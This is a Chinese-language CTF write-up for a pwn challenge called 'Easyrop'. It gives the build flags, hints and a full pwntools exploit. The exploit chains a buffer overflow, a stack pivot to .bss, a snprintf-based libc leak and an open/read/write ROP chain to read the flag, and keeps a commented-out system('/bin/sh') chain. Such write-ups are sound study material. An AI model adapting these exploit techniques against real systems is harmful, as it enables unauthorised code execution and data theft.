# Easyrop

## 题目信息：

* 题目名称：Easyrop
* 预估难度：中等
* 编译命令：gcc -O0 -Wl,-z,relro,-z,now   -fno-stack-protector  easyrop.c -o easyrop -no-pie

## 题目描述：

> You really know ROP?

## 题目提示：

1. pivot
2. snprintf (format string?)
3. ORW

## 原始 flag 及更新命令：

```shell
    # 原始 flag
    flag{flag_test}
    # ..
    # 更新 flag 命令
    echo 'flag{85c2a01a-55f7-442a-8712-3f6908e1463a}' > /flag
```

## writeup：

检查题目保护，保护全开

```bash
# tac @ ubuntu in /mnt/hgfs/Z/build/easyrop [5:56:01] 
$ checksec easyrop 
[*] '/mnt/hgfs/Z/build/easyrop/easyrop'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

没有canary和PIE

题目存在一个很容易发现的buffer overflow

但是不知道如何ROP?

4. stack pivot 到.bss段
2. snprintf 的第二个format string可控，将stdin写到.bss段上,从而用frpintf可以leak
3. 用ORW可以读出flag

EXP如下:

```python
#!python
#-*- coding: utf-8 -*-
#@Date: 2019-08-27 09:39:02
from pwn import *

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop = True)
sa = lambda x,y: p.sendafter(x,y)
sla = lambda x,y: p.sendlineafter(x,y)
s = lambda x: p.send(x)
sl = lambda x:p.sendline(x)

context.log_level = 'debug'
context.terminal = ['tmux','sp','-h','-l','110']

p = process("./easyrop")
# p = remote("0.0.0.0",2323)
elf = ELF('./easyrop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def csu_call(r12,r13,r14,r15,proc=0):
    '''
    execute r12(r13,r14,r15)
    '''
    payload = p64(proc+0x401B8A)
    # add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15;
    payload += p64(0)
    payload += p64(1)
    payload += p64(r12)+p64(r13)+p64(r14)+p64(r15)
    # mov  rdx, r13; mov  rsi, r14; mov  edi, r15d; call qword ptr [r12+rbx*8];
    payload += p64(proc+0x401B70)
    payload += 7*p64(0)

    return payload


pivot_addr = 0x602900
prdi_ret = 0x401b93
prsi1_ret = 0x401b91
prsp3_ret = 0x401b8d
pivot = 0x603a00

rop = flat(
    "A"*0x418,
    "\x28"*0x1,
    csu_call(elf.got['snprintf'],pivot,0x8,0x400018),
    p64(prsp3_ret),p64(pivot-0x18)
)
sla(">> ",rop)

#leaking 
rop = flat(
    "A"*0x418,
    "\x28"*0x1,
    csu_call(elf.got['snprintf'],0x603a30,0x8,0x603060),
    p64(0x401b86)+7*p64(0),
    p64(0x401b8A)+6*p64(0),
    p64(prdi_ret),p64(0),
    p64(prsi1_ret),p64(elf.got['alarm']),p64(0),
    p64(elf.plt['fprintf']),
    p64(prdi_ret),p64(0),
    p64(prsi1_ret),p64(0),p64(0),
    p64(0x4019F3)
)
sla(">> ",rop)
#orw

ru("\n\x00")
libc.address = u64(r(6).ljust(0x8,'\0')) - libc.sym['alarm']
log.info("libc.address:"+hex(libc.address))
system = libc.sym['system']
binsh = next(libc.search("/bin/sh\x00"))
opens = libc.sym['open']
read = libc.sym['read']
write = libc.sym['write']
binsh = next(libc.search("/bin/sh\0"))

#gdb.attach(p,'b *0x401AC2')
'''
rop = flat(
    'A'*0x418,
    "\x28",
    p64(0x400640),
    p64(prdi_ret)+p64(binsh)+p64(system)#+p64(read)+p64(write),
)
sla(">> ",rop)
'''

rop = flat(
    'A'*0x418,
    "\x28",
    p64(0x401b86)+p64(0)+p64(opens)+p64(read)+p64(write),
    3*p64(0),
    csu_call(0x603aa0,0,elf.bss()+0x100,0x8), #read
    p64(prdi_ret),p64(elf.bss()+0x100),
    p64(prsi1_ret),p64(0),p64(0),
    p64(opens),
    csu_call(0x603aa0,3,elf.bss()+0x100,0x20),
    csu_call(0x603aa8,1,elf.bss()+0x100,0x20)
)
sla(">> ",rop)

ru("\n\0")
pause()

s("flag\0\0\0\0")

p.interactive()
```